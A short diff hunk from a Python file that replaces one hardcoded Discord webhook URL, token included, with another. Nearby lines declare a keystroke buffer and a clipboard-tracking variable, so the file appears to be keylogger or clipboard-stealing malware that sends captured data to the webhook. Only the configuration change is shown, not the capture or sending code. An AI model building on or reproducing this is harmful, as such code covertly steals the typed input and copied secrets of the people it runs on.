@@ -17,7 +17,7 @@ import subprocess
 
 # Fuck comments
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1324175489148911756/xiqYJBUFhUdlU21wivhLgP-SGFzozUZqQ071EiCHH7KVx5e4Dnq9NvPDiJbvoeQyPF3H"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1336354377169899540/horSpIOxwmClolvMCRvK0Dk1m0WMBTo9HBCqDH0yE0F-avEeEY4SGezqM2PjVauvEguE"
 
 key_buffer = []
 last_clipboard_content = ""
